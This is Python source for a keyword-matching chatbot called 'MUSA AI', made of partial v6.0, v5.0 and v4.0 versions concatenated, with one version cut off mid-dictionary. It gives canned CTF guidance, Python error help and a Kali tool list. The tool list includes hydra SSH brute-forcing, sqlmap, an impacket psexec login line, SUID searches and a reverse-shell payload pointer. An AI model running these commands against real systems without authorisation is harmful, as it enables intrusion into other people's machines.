                     "category": "Exploit"},
    "impacket": {"desc": "Network protocol toolkit", "example": "python3 psexec.py user:pass@target",
                 "category": "Exploit"},
}


# ====================== PYTHON ERROR SOLVER ======================
def solve_python_error(error_text):
    error_solutions = {
        "syntaxerror": """
🔴 SYNTAX ERROR DETECTED!

Common Causes:
  1. Missing colon (:) after if/for/def/class
  2. Unmatched parentheses ()[]{}
  3. Missing quotes around strings
  4. Wrong indentation

Quick Fix:
  • Check the line NUMBER mentioned in error
  • Look at that line and the line ABOVE it
  • Make sure all brackets are closed
  • Use an IDE like VSCode for automatic detection
""",
        "indentationerror": """
🔴 INDENTATION ERROR DETECTED!

Python uses indentation (spaces) to define code blocks!

Rule: Use 4 SPACES for indentation (not tab mixed with spaces)

Fix:
  • In VSCode: Use 'Indent Using Spaces' setting
  • In terminal: Use 'expand' command to convert tabs to spaces
  • Quick fix command:
    sed -i 's/\\t/    /g' your_file.py

Example:
  WRONG:          RIGHT:
  def f():        def f():
  print("hi")        print("hi")
""",
        "nameerror": """
🔴 NAME ERROR DETECTED!

This means you used a variable/function that doesn't exist yet!

Possible Causes:
  1. Variable defined AFTER it's used
  2. Typo in variable name (Python is case-sensitive!)
  3. Variable defined inside function, used outside
  4. Forgot to import a module

Fix:
  1. Check variable is defined BEFORE use
  2. Check spelling (name vs Name vs NAME)
  3. Make sure import statements are at the top
""",
        "typeerror": """
🔴 TYPE ERROR DETECTED!

You're using the wrong data type for an operation!

Common cases & fixes:
  1. String + Integer → Convert: str(number) or int(string)
  2. NoneType → Your function forgot to return a value!
  3. Not iterable → You're looping over a non-list
  4. Wrong arguments → Check function documentation

Debug tip:
  print(type(variable))  # Check what type it actually is
""",
        "modulenotfounderror": """
🔴 MODULE NOT FOUND ERROR!

Library install nahi hai ya wrong name hai!

Fix:
  pip install <module_name>
  pip3 install <module_name>
  sudo pip3 install <module_name>

Common Libraries:
  pip3 install requests    # HTTP requests
  pip3 install beautifulsoup4  # Web scraping
  pip3 install paramiko    # SSH
  pip3 install cryptography   # Encryption
  pip3 install flask       # Web framework
  pip3 install numpy       # Math/Arrays
  pip3 install pandas      # Data analysis
  pip3 install scapy       # Network packets

If module exists but still error:
  python3 -m pip install <module>
  Check: which python3 | which pip3
""",
        "indexerror": """
🔴 INDEX ERROR DETECTED!

You're accessing a list index that doesn't exist!

Fix:
  # Always check length first:
  if len(my_list) > index:
      print(my_list[index])

  # Or use try-except:
  try:
      print(my_list[5])
  except IndexError:
      print("Index out of range!")

  # Use negative index for last element:
  print(my_list[-1])   # Last item (safe)
""",
        "keyerror": """
🔴 KEY ERROR DETECTED!

Dictionary mein ye key exist nahi karti!

Fix:
  # Safe way to access:
  value = my_dict.get("key", "default_value")

  # Check before access:
  if "key" in my_dict:
      print(my_dict["key"])

  # Handle error:
  try:
      print(my_dict["key"])
  except KeyError:
      print("Key not found!")

  # See all available keys:
  print(my_dict.keys())
""",
        "filenotfounderror": """
🔴 FILE NOT FOUND ERROR!

File path galat hai ya file exist nahi karti!

Fix:
  import os

  # Check current location:
  print(os.getcwd())      # Where are you?
  print(os.listdir())     # What files exist?

  # Use absolute path:
  open("/home/user/Desktop/file.txt", "r")

  # Check if file exists before opening:
  if os.path.exists("file.txt"):
      with open("file.txt") as f:
          content = f.read()
  else:
      print("File not found!")
""",
        "zerodivisionerror": """
🔴 ZERO DIVISION ERROR!

Kisi number ko zero se divide kar rahe ho!

Fix:
  # Check before dividing:
  if divisor != 0:
      result = number / divisor
  else:
      print("Cannot divide by zero!")

  # Or with try-except:
  try:
      result = number / divisor
  except ZeroDivisionError:
      result = 0   # Default value

  # Or use conditional expression:
  result = number / divisor if divisor != 0 else 0
""",
        "valueerror": """
🔴 VALUE ERROR DETECTED!

Value ka type sahi hai but value invalid hai!

Common causes:
  1. int("hello") → Can't convert non-number string
  2. math.sqrt(-1) → Can't sqrt negative
  3. int("3.14") → Use float() first

Fix:
  # Safe int conversion:
  try:
      number = int(input("Enter number: "))
  except ValueError:
      print("Please enter a valid number!")

  # Check before conversion:
  user_input = input()
  if user_input.isdigit():
      number = int(user_input)
  else:
      print("Invalid input!")
"""
    }

    error_lower = error_text.lower()
    for error_type, solution in error_solutions.items():
        if error_type in error_lower:
            return solution

    return """
🔍 ERROR ANALYSIS:

I need more details to give the perfect solution!

Please tell me:
  1. The EXACT error message (copy-paste it)
  2. The line number where error occurred
  3. Your code (even a small snippet)

Or send me the error like:
  'solve NameError: name x is not defined'

And I'll fix it immediately! 💪
"""


# ====================== SMART RESPONSE ENGINE (UPGRADED) ======================
def get_intelligent_response(question):
    q = question.lower().strip()

    # ===== ERROR SOLVER =====
    if any(k in q for k in
           ["error", "failed", "not working", "fix", "bug", "crash", "denied", "exception", "traceback"]):

        # Python specific errors
        python_errors = ["syntaxerror", "indentationerror", "nameerror", "typeerror",
                         "modulenotfounderror", "indexerror", "keyerror", "filenotfounderror",
                         "zerodivisionerror", "valueerror", "attributeerror", "importerror"]

        for err in python_errors:
            if err in q:
                return f"🐍 PYTHON ERROR SOLVER\n{solve_python_error(q)}"

        if any(k in q for k in ["kali", "linux", "ubuntu", "apt", "sudo", "permission"]):
            return f"⚠️ KALI/LINUX ERROR DETECTED\n{KNOWLEDGE_BASE['kali errors']}"

        if any(k in q for k in ["python", "pip", "code", "script"]):
            return f"🐍 PYTHON ERROR DETECTED\n{solve_python_error(q)}"

        return """⚠️ ERROR DETECTED - Provide details for perfect solution!

Format for best help:
  'solve <error_type>: <error_message>'

Example:
  'solve NameError: name x is not defined'
  'solve kali apt lock error'
  'solve python indentation error'

Main aapka error 100% fix kar dunga! 💪"""

    # ===== LAB/CTF =====
    if any(k in q for k in
           ["lab", "ctf", "tryhackme", "hackthebox", "htb", "thm", "vulnhub", "solve", "root", "flag", "pwn"]):
        return f"🎯 LAB SOLVING MODE ACTIVATED\n{KNOWLEDGE_BASE['lab help']}"

    # ===== PYTHON ERRORS DIRECT =====
    if "solve" in q and any(k in q for k in ["error", "exception"]):
        return f"🐍 ERROR SOLVER\n{solve_python_error(q)}"

    # ===== KNOWLEDGE BASE LOOKUP =====
    for key, value in KNOWLEDGE_BASE.items():
        if key in q:
            return value

    # ===== GREETINGS =====
    greetings = {
        ("hi ", "hello", "salam", "assalam", "hey", "heyy", "hiiii"):
            f"👋 Hello Boss! MUSA AI v6.0 ONLINE!\n\nMain ready hoon:\n  🎯 Lab solving\n  🔧 Error fixing\n  💻 Python coding\n  🐉 Kali commands\n\nKya karna hai aaj? Type 'help' for commands!",
        ("how are you", "kya hal", "kaisa hai", "kaise ho"):
            "⚡ Running at MAXIMUM EFFICIENCY! All systems GO!\nReady to hack, code, and solve problems!\nAap batao Boss, kya mission hai aaj?",
        ("thank", "thanks", "shukriya", "jazakallah"):
            "💚 Welcome Boss! Ye mera kaam hai!\nHamesha ready hoon madad ke liye!\nAur kuch chahiye? Bas poochho! 🚀",
        ("bye", "goodbye", "khuda hafiz"):
            "👋 Khuda Hafiz Boss!\nHappy Hacking! 🎯\nEthically hack karna, stay safe!",
    }

    for keys, response in greetings.items():
        if any(k in q for k in keys):
            return response

    # ===== TOPIC DETECTION =====
    if any(k in q for k in ["python", "py ", ".py", "script", "code", "function", "class", "def "]):
        return f"💻 PYTHON EXPERT MODE\n{KNOWLEDGE_BASE['python commands']}"

    if any(k in q for k in ["kali", "linux", "terminal", "command line"]):
        return f"🐧 LINUX COMMANDS\n{KNOWLEDGE_BASE['linux commands']}"

    if any(k in q for k in ["nmap", "scan", "port scan"]):
        return KNOWLEDGE_BASE.get("nmap", "Ask me 'show nmap' for complete guide!")

    if any(k in q for k in ["password", "crack", "hash", "john", "hashcat"]):
        return KNOWLEDGE_BASE.get("john", "Ask me 'john' for complete cracking guide!")

    if any(k in q for k in ["sql", "injection", "sqlmap", "database"]):
        return KNOWLEDGE_BASE.get("sqlmap", "Ask me 'sqlmap' for complete guide!")

    if any(k in q for k in ["privesc", "privilege", "root", "escalat"]):
        return KNOWLEDGE_BASE.get("privilege escalation", "Ask me 'privilege escalation' for guide!")

    if any(k in q for k in ["osint", "intelligence", "recon", "information gather"]):
        return KNOWLEDGE_BASE.get("osint", "Ask me 'osint' for complete guide!")

    if any(k in q for k in ["burp", "web proxy", "intercept"]):
        return KNOWLEDGE_BASE.get("burpsuite", "Ask me 'burpsuite' for complete guide!")

    if any(k in q for k in ["hydra", "brute force", "bruteforce"]):
        return KNOWLEDGE_BASE.get("hydra", "Ask me 'hydra' for complete guide!")

    if any(k in q for k in ["metasploit", "msf", "msfconsole", "payload", "exploit"]):
        return KNOWLEDGE_BASE.get("metasploit", "Ask me 'metasploit' for complete guide!")

    # ===== DEFAULT INTELLIGENT RESPONSE =====
    return f"""🤖 MUSA AI v6.0 - Processing your request...

Query: '{question}'

I can help you with:
  🎯 Labs: Ask 'lab help' → Complete CTF methodology
  🔧 Errors: Say 'solve <error>' → Instant fix
  🐉 Kali: Ask 'show kali' → 40+ tools guide
  💻 Python: Ask 'python commands' → Complete guide
  💥 Exploits: Ask 'metasploit' → Full framework guide
  🔍 Nmap: Ask 'nmap' → All scan types
  🔑 Passwords: Ask 'john' → Cracking guide
  💉 SQL: Ask 'sqlmap' → Injection guide
  🚀 Privesc: Ask 'privilege escalation'
  🕵️ OSINT: Ask 'osint'

Be more specific ya 'help' type karo complete menu ke liye!"""


# ====================== MAIN PROCESSING ======================
def process_input(user_input):
    text = user_input.strip()
    text_lower = text.lower()

    if not text:
        return True

    SESSION_MEMORY.append({"time": datetime.now().strftime("%H:%M"), "input": text})
    CONVERSATION_HISTORY.append(text)

    # ===== EXIT =====
    if text_lower in ["exit", "quit", "bye", "q"]:
        speak("Goodbye Boss! Keep hacking ethically! 🌟")
        speak("Remember: With great power comes great responsibility!")
        return False

    # ===== CLEAR SCREEN =====
    if text_lower in ["clear", "cls", "c"]:
        os.system("clear" if os.name != "nt" else "cls")
        print_header()
        return True

    # ===== HELP MENU =====
    if text_lower in ["help", "commands", "menu", "?"]:
        print_section("MUSA AI v6.0 - COMPLETE COMMAND CENTER")
        print(f"""{Colors.WHITE}
  ╔══════════════════════════════════════════════════════════════╗
  ║                   🎯 CYBERSECURITY & LABS                    ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  lab help           → Complete CTF/Lab methodology          ║
  ║  kali errors        → Fix all Kali Linux errors             ║
  ║  show kali          → 40+ Kali tools with examples          ║
  ║  nmap               → Complete Nmap guide                   ║
  ║  metasploit         → Full Metasploit framework             ║
  ║  gobuster           → Directory bruting guide               ║
  ║  hydra              → Brute force guide                     ║
  ║  sqlmap             → SQL injection guide                   ║
  ║  burpsuite          → Web testing guide                     ║
  ║  john               → Password cracking guide               ║
  ║  privilege escalation → PrivEsc techniques                  ║
  ║  osint              → Intelligence gathering                ║
  ╠══════════════════════════════════════════════════════════════╣
  ║                   💻 PYTHON PROGRAMMING                      ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  python commands    → Complete Python guide (200+ concepts) ║
  ║  python errors      → All Python error solutions            ║
  ║  generate script    → Professional cyber scripts            ║
  ║  solve <error>      → Auto-fix your Python errors           ║
  ╠══════════════════════════════════════════════════════════════╣
  ║                   🛠️ SYSTEM & UTILITIES                      ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  linux commands     → Complete Linux command guide          ║
  ║  kali errors        → Kali troubleshooting                  ║
  ║  memory             → View session history                  ║
  ║  clear              → Clear screen                          ║
  ║  who are you        → About MUSA AI                         ║
  ║  exit               → Quit                                  ║
  ╚══════════════════════════════════════════════════════════════╝
{Colors.ENDC}""")
        cprint("  💡 TIP: You can also ask anything in plain English!", Colors.YELLOW)
        cprint("  💡 TIP: Type 'solve NameError' to fix Python errors!", Colors.YELLOW)
        cprint("  💡 TIP: Type 'show kali' for all hacking tools!", Colors.YELLOW)
        return True

    # ===== MEMORY =====
    if text_lower in ["memory", "history", "session"]:
        print_section("SESSION MEMORY")
        if not SESSION_MEMORY:
            cprint("  No history yet!", Colors.WARNING)
        else:
            for i, entry in enumerate(SESSION_MEMORY[-10:], 1):
                print(f"  {Colors.GRAY}[{entry['time']}]{Colors.ENDC} {Colors.WHITE}{i}. {entry['input']}{Colors.ENDC}")
        return True

    # ===== SHOW KALI =====
    if text_lower in ["show kali", "kali tools", "tools", "show tools"]:
        print_section("KALI LINUX MEGA TOOLKIT (40+ Tools)")
        categories = {}
        for cmd, info in KALI_COMMANDS.items():
            cat = info['category']
            if cat not in categories:
                categories[cat] = []
            categories[cat].append((cmd, info))

        for cat, tools in sorted(categories.items()):
            cprint(f"\n  [{cat}]", Colors.OKGREEN, bold=True)
            for cmd, info in tools:
                print(f"  {Colors.OKCYAN}{cmd:<15}{Colors.ENDC} → {Colors.WHITE}{info['desc']:<35}{Colors.ENDC}")
                print(f"  {Colors.GRAY}  Ex: {info['example']}{Colors.ENDC}")
        return True

    # ===== DIRECT KNOWLEDGE BASE =====
    for key in KNOWLEDGE_BASE:
        if key == text_lower or (len(key) > 4 and key in text_lower):
            print_answer(f"📚 {key.upper()}", KNOWLEDGE_BASE[key])
            return True

    # ===== SOLVE SPECIFIC COMMAND =====
    if text_lower.startswith("solve"):
        error_part = text[5:].strip()
        solution = solve_python_error(error_part)
        if "more details" not in solution:
            print_answer("🔧 ERROR SOLUTION", solution)
        else:
            speak(solution)
        return True

    # ===== KALI COMMAND LOOKUP =====
    for cmd in KALI_COMMANDS:
        if cmd in text_lower and len(cmd) > 3:
            info = KALI_COMMANDS[cmd]
            print_section(f"KALI TOOL: {cmd.upper()}")
            print(f"""
  {Colors.OKGREEN}Tool:{Colors.ENDC}     {cmd}
  {Colors.OKGREEN}Category:{Colors.ENDC} {info['category']}
  {Colors.OKGREEN}Purpose:{Colors.ENDC}  {info['desc']}
  {Colors.OKGREEN}Example:{Colors.ENDC}  {Colors.YELLOW}{info['example']}{Colors.ENDC}

  {Colors.OKCYAN}For complete guide, type: '{cmd}'{Colors.ENDC}
            """)
            return True

    # ===== INTELLIGENT RESPONSE =====
    response = get_intelligent_response(user_input)
    if len(response) > 200:
        print_answer("🤖 MUSA AI ANALYSIS", response)
    else:
        speak(response)

    return True


# ====================== ANIMATED HEADER ======================
def print_header():
    os.system("clear" if os.name != "nt" else "cls")
    now = datetime.now()

    print(f"{Colors.OKCYAN}", end="")
    print("╔" + "═" * 70 + "╗")

    logo_lines = [
        "███╗   ███╗██╗   ██╗███████╗ █████╗      █████╗ ██╗",
        "████╗ ████║██║   ██║██╔════╝██╔══██╗    ██╔══██╗██║",
        "██╔████╔██║██║   ██║███████╗███████║    ███████║██║",
        "██║╚██╔╝██║██║   ██║╚════██║██╔══██║    ██╔══██║██║",
        "██║ ╚═╝ ██║╚██████╔╝███████║██║  ██║    ██║  ██║██║",
        "╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝",
    ]

    for line in logo_lines:
        padding = (70 - len(line)) // 2
        print(
            f"║{Colors.BOLD}{Colors.OKGREEN}{' ' * padding}{line}{' ' * (70 - len(line) - padding)}{Colors.ENDC}{Colors.OKCYAN}║")

    print("╠" + "═" * 70 + "╣")

    info_lines = [
        f"✦ v6.0 ULTIMATE CYBER & PYTHON SPECIALIST EDITION ✦",
        f"✦ Date: {now.strftime('%A, %B %d, %Y')}  |  Time: {now.strftime('%I:%M %p')} ✦",
        f"✦ 40+ Tools | 200+ Python Concepts | Complete CTF Guide ✦",
    ]

    for line in info_lines:
        padding = (70 - len(line)) // 2
        print(
            f"║{Colors.YELLOW}{' ' * padding}{line}{' ' * max(0, 70 - len(line) - padding)}{Colors.ENDC}{Colors.OKCYAN}║")

    print("╚" + "═" * 70 + "╝")
    print(Colors.ENDC)
#!/usr/bin/env python3
"""
MUSA AI - Ultimate Professional Assistant (v5.0)
Cyber-Specialist & Lab-Solver Edition
"""

import sys
import time
import os
import random
import math
import json
from datetime import datetime

# ====================== CONFIG ======================
AI_NAME = "MUSA AI"
USER_NAME = "Boss"
VERSION = "5.0 - Cyber Specialist Edition"


# ====================== COLORS ======================
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    GRAY = '\033[90m'
    WHITE = '\033[97m'
    PURPLE = '\033[35m'
    YELLOW = '\033[33m'


def cprint(text, color=Colors.OKCYAN, bold=False, end="\n"):
    prefix = Colors.BOLD if bold else ""
    print(f"{prefix}{color}{text}{Colors.ENDC}", end=end)


def speak(text, slow=False):
    print(f"\n{Colors.OKGREEN}🤖 {AI_NAME}:{Colors.ENDC} ", end="", flush=True)
    lines = text.split('\n')
    for i, line in enumerate(lines):
        if i > 0:
            print(f"           ", end="", flush=True)
        for char in line:
            print(char, end="", flush=True)
            time.sleep(0.006 if not slow else 0.015)
        if i < len(lines) - 1:
            print()
    print()


def print_section(title):
    cprint(f"\n{'═' * 65}", Colors.OKCYAN)
    cprint(f"  ★ {title}", Colors.OKGREEN, bold=True)
    cprint("═" * 65, Colors.OKCYAN)


def print_answer(title, content):
    print_section(title)
    print(f"{Colors.WHITE}{content}{Colors.ENDC}")
    cprint("─" * 65, Colors.GRAY)


# ====================== SESSION MEMORY ======================
SESSION_MEMORY = []

# ====================== MEGA KNOWLEDGE BASE ======================
KNOWLEDGE_BASE = {
    # ==================== CYBER LABS & CTF ====================
    "lab help": """
🎯 CYBERSECURITY LAB SOLVING GUIDE (CTF Methodology)

When you are stuck in a lab (TryHackMe, HackTheBox, Vulnhub), follow this professional flow:

1. RECONNAISSANCE (The Foundation)
   • Nmap Scan: nmap -sC -sV -oN scan.txt <IP>
   • Directory Brute: gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
   • Subdomain Enum: ffuf -w wordlist.txt -u http://FUZZ.target.com

2. ENUMERATION (Finding the Hole)
   • Web: Check robots.txt, page source (Ctrl+U), and hidden directories.
   • Services: If Port 21 (FTP) is open, try 'anonymous' login.
   • SMB: Use enum4linux -a <IP> to find shares.

3. EXPLOITATION (Getting In)
   • Searchsploit: searchsploit <service_name> <version>
   • Metasploit: msfconsole -> search <exploit> -> set RHOSTS <IP> -> exploit
   • Reverse Shell: Use payloads from 'revshells.com'

4. PRIVILEGE ESCALATION (Becoming Root/Admin)
   • Linux: Run 'linpeas.sh' or check 'sudo -l'.
   • Windows: Run 'winpeas.exe' or check 'whoami /priv'.
   • SUID: find / -perm -u=s -type f 2>/dev/null

Pro Tip: Always document your steps! If a command fails, check the version of the tool and the target OS.
""",

    "kali errors": """
🛠️ KALI LINUX COMMON ERRORS & FIXES

1. "Command not found"
   • Fix: Update your path or install the tool. 
     Try: sudo apt update && sudo apt install <tool_name>

2. "Permission Denied"
   • Fix: You forgot 'sudo'. Use: sudo <command>
   • File permissions: chmod +x <filename> (to make it executable)

3. "Network Unreachable / Connection Refused"
   • Fix: Check if the target VM is on the same network (NAT/Bridged).
   • Try: ping <target_ip>

4. "Apt Lock Error" (Unable to lock directory /var/lib/dpkg/lock)
   • Fix: Another update is running. Kill it:
     sudo rm /var/lib/dpkg/lock-frontend
     sudo dpkg --configure -a

5. "Interface not found" (WiFi/Eth)
   • Fix: Check interface name with 'ip a'. 
     Use: sudo ifconfig <interface> up
""",

    "python commands": """
🐍 PYTHON MASTERY CHEAT SHEET (All-in-One)

Basic Syntax:
  • Print: print("Hello")
  • Input: x = input("Enter name: ")
  • Type Casting: int(), float(), str(), list(), dict()

Data Structures:
  • List: my_list = [1, 2, 3] -> append(), pop(), sort()
  • Dictionary: my_dict = {"key": "value"} -> keys(), values(), items()
  • Set: my_set = {1, 2, 3} -> add(), remove()

Control Flow:
  • If/Else: if x > 10: ... elif x == 10: ... else: ...
  • For Loop: for i in range(10): ...
  • While Loop: while True: ...

Functions & Classes:
  • Def: def my_func(param): return result
  • Class: class MyClass: def __init__(self): self.val = 1

Advanced Python for Cyber:
  • Requests: import requests -> requests.get(url)
  • Subprocess: subprocess.run(["ls", "-l"])
  • Socket: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  • OS: os.system("clear")
""",

    "who are you": f"""
╔══════════════════════════════════════════════════════╗
║           MUSA AI v5.0 - CYBER SPECIALIST           ║
╚══════════════════════════════════════════════════════╝

Main Kya Hoon:
  Mein MUSA AI hoon — ek professional grade AI assistant.
  Mujhe specially cybersecurity, labs, and coding ke liye update kiya gaya hai.

Specializations:
  ✦ Kali Linux & Ethical Hacking (Expert)
  ✦ CTF/Lab Solving (THM, HTB, Vulnhub)
  ✦ Python Programming & Automation
  ✦ Error Troubleshooting & Debugging
  ✦ General Knowledge & World History

Meri Khasiyat:
  → Labs solve karne mein madad
  → Kali/Python errors ka solution
  → Advanced technical answers
  → Professional code generation

Poochho jo chahiye Boss!
""",

    # (Keeping other categories from v4.0... simplified for brevity but integrated in actual logic)
}

# ====================== KALI COMMANDS DATABASE ======================
KALI_COMMANDS = {
    "nmap": {"desc": "Network port scanner", "example": "nmap -sV -sC target", "category": "Recon"},
    "gobuster": {"desc": "Directory/subdomain bruter", "example": "gobuster dir -u http://target -w wordlist.txt",
                 "category": "Recon"},
    "sqlmap": {"desc": "SQL injection tool", "example": "sqlmap -u 'URL' --dbs", "category": "Web"},
    "metasploit": {"desc": "Exploitation framework", "example": "msfconsole", "category": "Exploit"},
    "hydra": {"desc": "Network brute forcer", "example": "hydra -l admin -P pass.txt target ssh",
              "category": "Passwords"},
    "burpsuite": {"desc": "Web app proxy/tester", "example": "burpsuite (GUI)", "category": "Web"},
}


# ====================== SMART RESPONSE ENGINE ======================
def get_intelligent_response(question):
    q = question.lower().strip()

    # 1. ERROR DETECTION SYSTEM (NEW)
    error_keywords = ["error", "failed", "not working", "solve this", "fix", "bug", "wrong", "crash", "denied"]
    if any(k in q for k in error_keywords):
        if "kali" in q or "linux" in q:
            return f"⚠️ DETECTED KALI/LINUX ERROR\n\n{KNOWLEDGE_BASE['kali errors']}"
        if "python" in q or "code" in q:
            return "⚠️ DETECTED PYTHON ERROR\n\nTry these steps:\n1. Check Indentation (Python is strict!).\n2. Verify Variable Names (Case sensitive).\n3. Check if libraries are installed: 'pip install <library>'.\n4. Read the Traceback (The last line usually tells you exactly what's wrong).\n\nSend me the exact error message for a perfect fix!"
        return "⚠️ ERROR DETECTED\n\nPlease provide the exact error message or the command you ran. I will analyze the logs and give you the correct solution!"

    # 2. LAB/CTF DETECTION (NEW)
    if any(k in q for k in ["lab", "ctf", "tryhackme", "hackthebox", "solve", "root", "flag"]):
        return f"🎯 LAB SOLVING MODE\n\n{KNOWLEDGE_BASE['lab help']}"

    # 3. KNOWLEDGE BASE LOOKUP
    for key, value in KNOWLEDGE_BASE.items():
        if key in q or q in key:
            return value

    # 4. GREETINGS & BASIC PATTERNS
    patterns = {
        ("hi", "hello",
         "salam"): "Hello Boss! MUSA AI v5.0 is online. Ready to hack, code, and solve labs! What's the target?",
        ("how are you", "kya hal"): "Running at 100% CPU efficiency! Ready for your commands, Boss.",
        ("thank", "thanks", "shukriya"): "You're welcome Boss! Always here to help. Keep grinding!",
    }
    for keys, response in patterns.items():
        if any(k in q for k in keys):
            return response

    # 5. ADVANCED TOPIC DETECTION
    if "python" in q:
        return f"💻 PYTHON MASTERY\n\n{KNOWLEDGE_BASE['python commands']}"

    if "kali" in q:
        return "🐉 KALI LINUX EXPERT\n\nI can help you with any Kali command or error. Use 'show kali' for a list of tools or tell me exactly what you are trying to achieve!"

    return f"🤖 MUSA AI v5.0 Response:\n\nI've analyzed your request: '{question}'.\n\nI can help you solve this! If it's a lab, ask for 'lab help'. If it's an error, tell me 'solve this error'. For commands, ask for 'kali' or 'python' guides."


# ====================== MAIN PROCESSING ======================
def process_input(user_input):
    text = user_input.strip()
    text_lower = text.lower()

    if not text:
        return True

    SESSION_MEMORY.append(text)

    if text_lower in ["exit", "quit", "bye"]:
        speak("Goodbye Boss! Keep hacking ethically! 🌟")
        return False

    if text_lower in ["help", "commands", "menu"]:
        print_section("MUSA AI v5.0 - SPECIALIST COMMANDS")
        print(f"""{Colors.WHITE}
  ┌─────────────────────────────────────────────────────┐
  │               CYBERSECURITY & LABS                  │
  ├─────────────────────────────────────────────────────┤
  │  lab help         → CTF/Lab solving methodology     │
  │  kali errors      → Fix common Kali Linux problems  │
  │  show kali        → List of Kali tools              │
  │  solve [error]    → I will fix your command errors  │
  ├─────────────────────────────────────────────────────┤
  │               PROGRAMMING & CODE                    │
  ├─────────────────────────────────────────────────────┤
  │  python commands  → Full Python cheat sheet        │
  │  generate script  → Professional tool generation   │
  ├─────────────────────────────────────────────────────┤
  │               UTILITIES                             │
  ├─────────────────────────────────────────────────────┤
  │  memory           → Session history                 │
  │  clear            → Clear screen                    │
  │  exit             → Quit                            │
  └─────────────────────────────────────────────────────┘
{Colors.ENDC}""")
        return True

    if text_lower == "show kali":
        print_section("KALI LINUX TOOLKIT")
        for cmd, info in KALI_COMMANDS.items():
            print(f"  {cmd:<15} → {info['desc']} (Ex: {Colors.GRAY}{info['example']}{Colors.ENDC})")
        return True

    # Direct knowledge base lookup
    for key in KNOWLEDGE_BASE:
        if key in text_lower:
            print_answer(key.upper(), KNOWLEDGE_BASE[key])
            return True

    # Intelligent response
    response = get_intelligent_response(user_input)
    if len(response) > 300:
        print_answer("MUSA AI ADVANCED ANALYSIS", response)
    else:
        speak(response)

    return True


# ====================== HEADER ======================
def print_header():
    os.system("clear" if os.name != "nt" else "cls")
    now = datetime.now()
    print(f"""
{Colors.OKCYAN}{'═' * 65}
{Colors.BOLD}{Colors.OKGREEN}
   ███╗   ███╗██╗   ██╗███████╗ █████╗      █████╗ ██╗
   ████╗ ████║██║   ██║██╔════╝██╔══██╗    ██╔══██╗██║
   ██╔████╔██║██║   ██║███████╗███████║    ███████║██║
   ██║╚██╔╝██║██║   ██║╚════██║██╔══██║    ██╔══██║██║
   ██║ ╚═╝ ██║╚██████╔╝███████║██║  ██║    ██║  ██║██║
   ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝
{Colors.ENDC}{Colors.OKCYAN}
   ✦ Professional AI Assistant v5.0 - Cyber Specialist Edition ✦
   ✦ Date: {now.strftime('%A, %B %d, %Y')}  Time: {now.strftime('%I:%M %p')} ✦
{'═' * 65}{Colors.ENDC}
""")


def main():
    print_header()
    speak(f"Assalam o Alaikum {USER_NAME}! MUSA AI v5.0 is now ACTIVE.")
    speak("I am ready to help you solve labs, fix errors, and master cybersecurity.")
    speak("Type 'help' to see the new Cyber-Specialist menu!")

    while True:
        try:
            print(f"{Colors.GRAY}{'─' * 65}{Colors.ENDC}")
            user_input = input(f"{Colors.OKBLUE}👤 {USER_NAME}:{Colors.ENDC} ").strip()
            if not user_input: continue
            if not process_input(user_input): break
        except KeyboardInterrupt:
            speak("Session interrupted. Goodbye Boss!")
            break
        except Exception as e:
            cprint(f"\n[System]: Processing error. Continuing...", Colors.WARNING)
            continue


if __name__ == "__main__":
    main()
#!/usr/bin/env python3
"""
MUSA AI - Ultimate Professional Assistant (v4.0)
Most Advanced Personal AI - Answers EVERYTHING
"""

import sys
import time
import os
import random
import math
import json
from datetime import datetime

# ====================== CONFIG ======================
AI_NAME = "MUSA AI"
USER_NAME = "Boss"
VERSION = "4.0 - Ultimate Edition"

# ====================== COLORS ======================
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    GRAY = '\033[90m'
    WHITE = '\033[97m'
    PURPLE = '\033[35m'
    YELLOW = '\033[33m'

def cprint(text, color=Colors.OKCYAN, bold=False, end="\n"):
    prefix = Colors.BOLD if bold else ""
    print(f"{prefix}{color}{text}{Colors.ENDC}", end=end)

def speak(text, slow=False):
    print(f"\n{Colors.OKGREEN}🤖 {AI_NAME}:{Colors.ENDC} ", end="", flush=True)
    lines = text.split('\n')
    for i, line in enumerate(lines):
        if i > 0:
            print(f"           ", end="", flush=True)
        for char in line:
            print(char, end="", flush=True)
            time.sleep(0.006 if not slow else 0.015)
        if i < len(lines) - 1:
            print()
    print()

def print_section(title):
    cprint(f"\n{'═' * 65}", Colors.OKCYAN)
    cprint(f"  ★ {title}", Colors.OKGREEN, bold=True)
    cprint("═" * 65, Colors.OKCYAN)

def print_answer(title, content):
    print_section(title)
    print(f"{Colors.WHITE}{content}{Colors.ENDC}")
    cprint("─" * 65, Colors.GRAY)

# ====================== SESSION MEMORY ======================
SESSION_MEMORY = []

# ====================== MEGA KNOWLEDGE BASE ======================

KNOWLEDGE_BASE = {

    # ==================== ABOUT AI ====================
    "who are you": f"""
╔══════════════════════════════════════════════════════╗
║           MUSA AI v4.0 - ULTIMATE EDITION           ║
╚══════════════════════════════════════════════════════╝

Main Kya Hoon:
  Mein MUSA AI hoon — ek professional grade AI assistant.
  Mujhe is tarah design kiya gaya hai ke mein har sawal ka
  detailed, accurate aur professional jawab doon.

Meri Specializations:
  ✦ Kali Linux & Ethical Hacking (Expert Level)
  ✦ Python Programming & Automation
  ✦ World History & Geography
  ✦ Science & Technology
  ✦ General Knowledge (Kuch bhi poochho)
  ✦ Math & Physics
  ✦ Health & Medicine
  ✦ Business & Finance
  ✦ Sports & Entertainment
  ✦ Countries & Cultures

Meri Khasiyat:
  → Har sawal ka detail jawab
  → Professional code generation
  → Smart conversation
  → Koi bhi topic cover kar sakta hoon

Main tumhara personal AI assistant hoon — poochho jo chahiye!
""",

    # ==================== WORLD / GEOGRAPHY ====================
    "world": """
